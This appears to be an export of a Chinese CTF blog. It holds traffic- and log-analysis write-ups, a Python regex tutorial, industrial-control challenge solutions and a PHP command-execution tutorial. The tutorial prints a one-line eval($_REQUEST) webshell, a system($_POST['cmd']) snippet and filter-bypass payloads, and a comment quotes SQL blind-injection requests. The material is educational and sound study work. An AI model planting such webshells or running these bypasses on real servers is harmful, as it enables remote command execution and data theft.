<h3 id="能从流量包中提取出文件的"><a href="#能从流量包中提取出文件的" class="headerlink" title="能从流量包中提取出文件的"></a>能从流量包中提取出文件的</h3><p>这一块大部分都能通过导出文件这一操作来实现，当然有些时候用binwalk或者是formost分离出来，如果这个文件是在流量包中的，那么这两个工具提取可能没有那么顺利，比如说一个图片可能能提出来，但是损坏了，这样很影响后边的判断。但是如果是流量文件隐写了个文件，这俩工具还是挺好用的。</p>
<p>导出文件操作呢，不熟悉wireshark的可能不会</p>
<p>具体就是</p>
<p><code>左上角文件—&gt;导出对象</code></p>
<p><img src="https://s1.ax1x.com/2022/06/17/Xb0t3t.png"></p>
<p>还有一种是流量包中存在被base64编码过的文件</p>
<p>经典的菜刀666，之前也有写过，在<a href="https://charmersix.icu/2022/05/03/SkyMirror-WP-simple-flow/">这里</a></p>
<h3 id="SQL盲注流量"><a href="#SQL盲注流量" class="headerlink" title="SQL盲注流量"></a>SQL盲注流量</h3><p>这一块在日志分析，流量分析中都会涉及，考到了也不难，就是那一种题型</p>
<p>之前也在<a href="https://charmersix.icu/2022/04/29/SQLflow/">这里</a>写过</p>
<p>之前没有提供脚本，这边给大家一个，但是需要根据具体题目自己改一改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2038,%201))&gt;125</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;sqltest.pcapng&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:<span class="comment">#读取pcap文件</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),&quot;</span> <span class="keyword">in</span> i):</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            a.append(i)<span class="comment">#把这些东西搞到a数组里</span></span><br><span class="line">a1 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    b = re.search(<span class="string">br&quot;%200,1\)\),%20(\d+),%201\)\)&quot;</span>,i).group(<span class="number">1</span>)</span><br><span class="line">    c = re.search(<span class="string">br&quot;&gt;(\d+) HTTP/1.1&quot;</span>,i).group(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#print(b)</span></span><br><span class="line">    <span class="comment">#print(c)</span></span><br><span class="line">    a1[<span class="built_in">int</span>(b)] = <span class="built_in">int</span>(c)</span><br><span class="line"><span class="comment">#从a开始调出来</span></span><br><span class="line"><span class="comment">#print(a1)</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(a1[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#整成一行</span></span><br></pre></td></tr></table></figure>

<h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>这一块常考的就是键鼠，都考烂了，应该不会难，2022国赛换汤不换出了一个，也是给我整懵逼了，这里边分了两块，一部分是能跑出个压缩包，另一部分是密码，刚开始没意识到，跑出来rar损坏，然后把队友思路都整偏了，都在修rar，我的错我的错。</p>
<p>比较难的，见过一个数位板<a href="https://charmersix.icu/2022/04/30/usb%20wireshark/">这里</a>写过</p>
<p>还可能会出现一些手柄，刻字机啥的。</p>
<p>然后推荐雪殇以及其他两位大佬共同写的一个工具，只能说tql</p>
<p>工具在<a href="https://github.com/jiayuqi7813/knm">这里</a></p>
<h3 id="根据题目要求做题"><a href="#根据题目要求做题" class="headerlink" title="根据题目要求做题"></a>根据题目要求做题</h3><p>这部分一定要认真读题，可能并不是找flag，一定要看清楚让你找啥，比如说一些工控题目，webshell比如<a href="https://charmersix.icu/2022/04/29/webshell/">这个</a></p>
<p>这部分里也有你从未接触过的知识，这样可以仔细看一下追踪流，找找有什么规律，比如2021国赛题目robot，之前也是写过</p>
<p>还有就是第二届网刃杯：喜欢移动的黑客、LED_BOOM</p>
<p>一定一定要认真读题，认真分析，认真找规律。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>流量分析大体思路</p>
<blockquote>
<ol>
<li>拿到后，先看一下题目题干，然后先find</li>
<li>如果没有找到，看一下是不是http，若果是先统计http请求看一下，或者是放到科莱里，总体看一下</li>
<li>导出对象，看一下</li>
<li>追踪流，挨个流看，如果很多，倒着看</li>
<li>string跑一下</li>
<li>是不是usb，跑脚本</li>
<li>有没有隐写</li>
<li>有没有大串编码</li>
<li>从来没见过的协议，去百度</li>
<li>记得把文件放010editor里看一下</li>
</ol>
</blockquote>
<p>这部分还算是比较简单，算是基础吧，像那些WiFi，被加密过的流量，都还没有写，因为那些我也玩的不遛</p>
]]></content>
      <tags>
        <tag>flow</tag>
        <tag>Misc</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>python re模块</title>
    <url>/2022/05/03/python%20re/</url>
    <content><![CDATA[<p>初识re</p>
<h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>findall : 匹配字符串中所有的符合正则内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">list</span> = re.findall(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>

<h3 id="finditer"><a href="#finditer" class="headerlink" title="finditer"></a>finditer</h3><p>finditer : 匹配字符串中所有内容（返回的是迭代器）;从迭代器里拿到内容需要.group()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">it = re.finditer(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it :</span><br><span class="line">    <span class="built_in">print</span>(i.group())</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>search : 找到一个结果就返回，返回结果是match对象，需要.group()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = re.search(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.group())</span><br></pre></td></tr></table></figure>

<h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><p>match : 从头开始匹配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">m = re.match(<span class="string">r&quot;\d+&quot;</span>,<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.group())</span><br></pre></td></tr></table></figure>

<h3 id="预加载正则表达"><a href="#预加载正则表达" class="headerlink" title="预加载正则表达"></a>预加载正则表达</h3><p>先正则匹配，再re</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret =  obj.finditer(<span class="string">&quot;my phone number is : 10086 ; my girlfriend&#x27;s phonenumber is : 10010&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> ret : </span><br><span class="line">    <span class="built_in">print</span>(it.group())</span><br></pre></td></tr></table></figure>

<h4 id="一个鲜明的预加载例子"><a href="#一个鲜明的预加载例子" class="headerlink" title="一个鲜明的预加载例子"></a>一个鲜明的预加载例子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;jay&#x27;&gt;&lt;span id= &#x27;1&#x27;&gt;郭麒麟&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;jj&#x27;&gt;&lt;span id= &#x27;2&#x27;&gt;郭德纲&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;mike&#x27;&gt;&lt;span id= &#x27;3&#x27;&gt;于谦&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class= &#x27;jack&#x27;&gt;&lt;span id= &#x27;4&#x27;&gt;岳云鹏&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#  (?P&lt;分组名字&gt;正则) 可以单独从正则匹配内容中提取所需</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;div class= &#x27;(?P&lt;english&gt;.*?)&#x27;&gt;&lt;span id= &#x27;(?P&lt;id&gt;\d+)&#x27;&gt;(?P&lt;德云社&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)<span class="comment">#让. 能匹配到换行符</span></span><br><span class="line">result = obj.finditer(a)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result :</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;english&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;id&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;德云社&quot;</span>))</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021)日志分析系列</title>
    <url>/2022/05/24/rizhifenxi/</url>
    <content><![CDATA[<p>这一系列一共有两部分，一部分是日志分析的三个题目，另一部分是简单的日志分析</p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h4><p>这题让找源码文件，根据经验，源码一般放在<code>www/wwwroot</code>下边</p>
<p>直接CTRL+F找一下，果然有。</p>
<p><img src="https://img-blog.csdnimg.cn/6c1fc74849f34c4fa88aa1c463ebe12b.png"></p>
<h4 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h4><p>一眼顶针</p>
<p><img src="https://img-blog.csdnimg.cn/6a162b49eba64f8e95b301d920e42b09.png"></p>
<p>解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/843d004995324ac8920d46c29bb00008.png"></p>
<p>这不很明显<code>sess_car</code></p>
<h4 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h4><p>从（2）能看出一段反序列化，那么类自然就是<code>SplFileObject</code></p>
<h3 id="简单日志分析"><a href="#简单日志分析" class="headerlink" title="简单日志分析"></a>简单日志分析</h3><h4 id="（1）-1"><a href="#（1）-1" class="headerlink" title="（1）"></a>（1）</h4><p>打开浏览一下</p>
<p><img src="https://img-blog.csdnimg.cn/d2daa3d491744701bcf4d3fccfc5fa99.png"></p>
<p>发现这么个东西，像极了base64</p>
<p>解码看，懂的都懂</p>
<p><img src="https://img-blog.csdnimg.cn/9a562992d88145a0a626046506e9e8e0.png"></p>
<p>参数就是<code>user</code>了</p>
<h4 id="（2）-1"><a href="#（2）-1" class="headerlink" title="（2）"></a>（2）</h4><p>又见base64</p>
<p><img src="https://img-blog.csdnimg.cn/d5ac6159e3784ee9a06591ac9be8ee4d.png"></p>
<h4 id="（3）-1"><a href="#（3）-1" class="headerlink" title="（3）"></a>（3）</h4><p>还是base64，好没劲啊</p>
<p><img src="https://img-blog.csdnimg.cn/782157cc0e814fa2a6a8efdfd35436ed.png"></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>SkyMirror_WP_USB流量分析</title>
    <url>/2022/04/30/usb%20wireshark/</url>
    <content><![CDATA[<h3 id="RoarCTF2019-davinci-cipher-数位板流量分析"><a href="#RoarCTF2019-davinci-cipher-数位板流量分析" class="headerlink" title="(RoarCTF2019)davinci_cipher_数位板流量分析"></a>(RoarCTF2019)davinci_cipher_<em>数位板流量分析</em></h3><p>这是我目前做的比较难的一个流量分析，这题干扰项超级多，但是根据提示能知道是个usb流量分析，如果没有这个提示，做这个题绝对是超级艰难；题目在<a href="http://ctfer.club/challenges#[RoarCTF2019]davinci_cipher-116">这儿</a></p>
<p>首先flag.txt：通过百度，可以得出是一串emoji的Unicode的编码，可以来<a href="https://r12a.github.io/app-conversion/">这里</a>解码一下</p>
<p>然后经过初步的流量分析（或者说是看提示），可以看出有一串非常可疑的USB流量tshark分离一下</p>
<blockquote>
<p>tshark -r k3y.pcapng -T fields -e usbhid.data &gt; usbdata.txt</p>
</blockquote>
<p>看别的大佬的博客，学到了一种处理空白数据的方法</p>
<blockquote>
<p>tshark -r ‘k3y.pcapng’ -T fields -e usbhid.data |sed ‘/^$/d’ &gt; usbdata.txt</p>
</blockquote>
<p>再看流量，看到了wacom是一块数位板</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSGoJ1.png"></p>
<p>wacom是有压感的绘图板，详细说明在<a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">USB协议文档</a>里的<strong>Figure 19</strong>：</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSGTRx.png"></p>
<p>一般都是x坐标2个字节，Y坐标也是2个字节，又因为X，Y坐标均以小端方式存储，因此画图坐标个位数字变化会大一些。猜测坐标如图所示（深紫X，浅蓝Y，红色压感）。</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSGIiR.png"></p>
<p>开始处理一下有用数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;coor.txt&quot;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;usbdata.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(line)==<span class="number">55</span>):</span><br><span class="line">        a.write(line)</span><br><span class="line"><span class="comment">#把没必要的数据过滤掉，依据长度</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>

<p>剃掉压感为0的数据，把坐标提取出来还原成10进制。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">open</span>(<span class="string">&quot;finish.txt&quot;</span>,<span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">x1 = []</span><br><span class="line">y1 = []</span><br><span class="line">x2 = []</span><br><span class="line">y2 = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;coor.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">16</span>:<span class="number">18</span>]!=<span class="string">&quot;00&quot;</span>):</span><br><span class="line">        x1.append(line[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">        y1.append(line[<span class="number">10</span>:<span class="number">14</span>])</span><br><span class="line"><span class="comment">#筛选必要的坐标数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x1:</span><br><span class="line">    x2.append(<span class="built_in">int</span>(i[<span class="number">2</span>:<span class="number">4</span>]+i[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> y1:</span><br><span class="line">    y2.append(<span class="built_in">int</span>(j[<span class="number">2</span>:<span class="number">4</span>]+j[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="comment">#把十六进制坐标转为十进制</span></span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x2)):<span class="comment">#根据 一般都是x坐标2个字节，Y坐标也是2个字节 再判断一下</span></span><br><span class="line">    a.write(<span class="built_in">str</span>(x2[z])+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(y2[z])+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后放到gnuplot</p>
<blockquote>
<p>plot “finish.txt”</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2022/04/30/OSG4o9.png"></p>
<p>反转一下得到</p>
<blockquote>
<p>MONA_LISA_IS_A_MAN</p>
</blockquote>
<p>用第一步flag.txt里的emoji作为密文，上步得出的字符串作为密钥，<a href="https://aghorler.github.io/emoji-aes/#">emoji解密</a>，得到flag。</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>SkyMirror</tag>
        <tag>python</tag>
        <tag>USB_flow</tag>
      </tags>
  </entry>
  <entry>
    <title>（2022第二届网刃杯） ISC</title>
    <url>/2022/04/29/wangren2022ics/</url>
    <content><![CDATA[<h3 id="ncsubj"><a href="#ncsubj" class="headerlink" title="ncsubj"></a>ncsubj</h3><p>这题主要考点是编码方面，打开，追踪流一下，发现奇奇怪怪编码</p>
<img src="https://img-blog.csdnimg.cn/e99722acc11740919d172799f392ed56.png" style="zoom:67%;" />

<p>三段，长得很像base64，解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/3151d795090546dc9f1393f9c5273a9e.png"></p>
<p>果然，没有想象的那么简单，继续解码</p>
<p><img src="https://img-blog.csdnimg.cn/1dee0d006c7f4fbfae834a9652ee0caa.png"></p>
<p>whatancsubject很像，还真是</p>
<h3 id="喜欢移动的黑客"><a href="#喜欢移动的黑客" class="headerlink" title="喜欢移动的黑客"></a>喜欢移动的黑客</h3><p>比赛时候，正常开，打不开，分了一下，出来了个压缩包，就以为是压缩包，然后思路走偏了。</p>
<p>之前从来没有接触过流量的文件头，也没看出来，这次涨姿势了。</p>
<p>把题目中的pcapang和正常的pcapang放一起，会很明显发现文件头不一样，头四位前面改成 0A0D0D0A ，就能正常打开</p>
<p>继续看，结合提议，筛选出modbus，流量中的数据一般是HEX，所以算一下10000的HEX = 2710</p>
<p>继续翻找，发现异常</p>
<p><img src="https://img-blog.csdnimg.cn/9462a093fd564a8c8c3e53a53e07ffb7.png"></p>
<p>转回10进制，10086，拼接68156</p>
<p>得到flag</p>
<h3 id="xyp07"><a href="#xyp07" class="headerlink" title="xyp07"></a>xyp07</h3><p>这题推荐一款工具<code>科来网络分析系统</code>官网是能下到的</p>
<p>也不知道是不是巧合，我也是第一次用这款工具，</p>
<p>咱们直接打开，把流量包一扔，它就诊断出来了</p>
<p><img src="https://img-blog.csdnimg.cn/9bac756c1a034cdfa368545b8b0b0394.png"></p>
<p>打开一翻，出现奇怪东西</p>
<p><img src="https://img-blog.csdnimg.cn/b6e0d190c47042a485fcca76366c848e.png"></p>
<p>解码，base91</p>
<img src="https://img-blog.csdnimg.cn/80431d5e0fe2416eb7a0e97282036c45.png" style="zoom:67%;" />

<h3 id="cryptolalia"><a href="#cryptolalia" class="headerlink" title="cryptolalia"></a>cryptolalia</h3><p>题目在<a href="http://ctfer.club/challenges#cryptolalia-134">这儿</a></p>
<p>题目附件为一张图片，直接修改后缀，能得到一个压缩包，压缩包注释一条鱼，并且放出hint：鱼很重要</p>
<p>暂时不知道有什么用，继续看</p>
<p>又有hint，能爆破，果然爆破出<code>污泥脱水间数据详情</code>的密码</p>
<img src="https://img-blog.csdnimg.cn/d80d3e85b28d4fb7b67cd221b856dd10.png" style="zoom:67%;" />

<p>打开流量，懵逼了，猜测被加密过，追踪TCP流发现</p>
<p><img src="https://img-blog.csdnimg.cn/52db43206a334d3e950f52a9a91ab9c2.png"></p>
<p>发现似乎密文<code>U2FsdGVkX19pczQKWsMcjgrJt8f09dSN</code></p>
<p>来到<a href="https://www.sojson.com/encrypt.html">这里</a>，联想fish</p>
<p>解码得到<img src="https://img-blog.csdnimg.cn/85447d32f06243a1aa25c4088dae7e0c.png"></p>
<p>得到<code>设备药剂间数据详情</code>压缩包密码，解压后又一压缩包和txt，txt最后说<code>年轻人，有时候眼见不一定为实！</code></p>
<p>什么意思，莫非是伪加密，好家伙，一修复就好了</p>
<p>解压又得到一流量</p>
<p>无脑追踪流，0流就发现异常</p>
<p><img src="https://img-blog.csdnimg.cn/2ae09c7c517f47b79b4cd96354ad8d07.png"></p>
<p>把图片导出来，修改高度就能得到</p>
<p><img src="https://img-blog.csdnimg.cn/7e9c664607dd4ad29b5240908c7c414c.png"></p>
<h3 id="LED-BOOM"><a href="#LED-BOOM" class="headerlink" title="LED_BOOM"></a>LED_BOOM</h3><p>这题不难，认真读题很重要，搞安全一定要对一切信息很敏感</p>
<p>这题当时没有认真读题，所以没有做出来</p>
<p>先看题，题目在<a href="http://ctfer.club/challenges#LED_BOOM-131">这儿</a></p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSFMM6.png"></p>
<p>雪殇直接一眼顶针AES，我是一眼看不出来，得猜</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSFuxx.png"></p>
<p>题干在这里，<code>强调三次</code>筛选一下s7comm，按照长度，会发现有三个length相同的包，细看发现了LED:On ，Off</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSA454.png"></p>
<p>得到<code>585692787</code></p>
<p>结合图片中的密文，<code>U2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6z</code>解秘一下</p>
<p>在<a href="https://www.sojson.com/encrypt_aes.html">这里</a>解码得到</p>
<p><img src="https://s1.ax1x.com/2022/04/30/OSVMfH.png"></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>SkyMirror</tag>
        <tag>ISC</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_2_PHP命令执行+代码执行</title>
    <url>/2022/09/07/web_2/</url>
    <content><![CDATA[<h2 id="第一节-php的基础知识"><a href="#第一节-php的基础知识" class="headerlink" title="第一节 php的基础知识"></a>第一节 php的基础知识</h2><h3 id="0x1-php的基本概念"><a href="#0x1-php的基本概念" class="headerlink" title="0x1 php的基本概念"></a>0x1 php的基本概念</h3><p>php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。</p>
<h3 id="0x2-php环境的安装"><a href="#0x2-php环境的安装" class="headerlink" title="0x2 php环境的安装"></a>0x2 php环境的安装</h3><h4 id="php-的运行环境"><a href="#php-的运行环境" class="headerlink" title="php 的运行环境"></a>php 的运行环境</h4><p>phpstudy</p>
<h4 id="php-的开发环境"><a href="#php-的开发环境" class="headerlink" title="php 的开发环境"></a>php 的开发环境</h4><p>? 区分文件和参数部分</p>
<p>参数部分 用 &amp; 区分 多个键值对</p>
<p>单个键值对用 = 分开</p>
<h3 id="0x3-php写一个hello-world"><a href="#0x3-php写一个hello-world" class="headerlink" title="0x3 php写一个hello world"></a>0x3 php写一个hello world</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x3-php基础语法"><a href="#0x3-php基础语法" class="headerlink" title="0x3 php基础语法"></a>0x3 php基础语法</h3><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当get和post函数被禁用时，可以使用request函数</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">add</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="第二节-php的命令执行"><a href="#第二节-php的命令执行" class="headerlink" title="第二节 php的命令执行"></a>第二节 php的命令执行</h2><h3 id="0x1-什么是命令执行"><a href="#0x1-什么是命令执行" class="headerlink" title="0x1 什么是命令执行"></a>0x1 什么是命令执行</h3><p>RCE</p>
<h3 id="0x2-php的command-exec函数"><a href="#0x2-php的command-exec函数" class="headerlink" title="0x2 php的command exec函数"></a>0x2 php的command exec函数</h3><p>PHP官方有下面六种函数可以执行系统命令</p>
<ul>
<li>system</li>
<li>passthru</li>
<li>exec</li>
<li>shell_exec</li>
<li>popen</li>
<li>pcntl_exec4</li>
<li>执行运算符</li>
</ul>
<h3 id="0x3-php的命令执行利用"><a href="#0x3-php的命令执行利用" class="headerlink" title="0x3 php的命令执行利用"></a>0x3 php的命令执行利用</h3><p>php的命令执行，我们默认讨论的是服务器系统为Linux</p>
<p>shell 的<code>分号 ;</code> 可以用来分割两条命令</p>
<p>并列命令&amp;&amp;的url编码(%26%26) 也可以分割两条命令   but &amp;&amp;前的命令成功执行，后面的才会成立</p>
<p>|| 表示或 ， 可以分割两条命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//不显示报错</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">//代码高亮</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h5><p>如果 flag/cat 等命令被过滤，可以使用正则、其他未被过滤命令、base64编码解码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`echo dGFjIGZsYWcucGhw | base64 -d`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在linux当中反引号也十分常用，也就是 ` 符号。那么反引号是怎么使用的呢？我的理解是凡是打上反引号的命令，首先将反引号内的命令执行一次，然后再将已经执行过的命令得到的结果再执行一次，就可以得到我们反引号的输出</p>
</blockquote>
<h5 id="变量拼接绕过关键字"><a href="#变量拼接绕过关键字" class="headerlink" title="变量拼接绕过关键字"></a>变量拼接绕过关键字</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></figure>

<h5 id="爆破被过滤的符号"><a href="#爆破被过滤的符号" class="headerlink" title="爆破被过滤的符号"></a>爆破被过滤的符号</h5><p>符号被过滤可以爆破一下，</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png" alt="image-20220903213502790" style="zoom: 67%;" />

<p>可以使用{}和冒号: 截取空格</p>
<p>使用env浏览环境变量，然后截取</p>
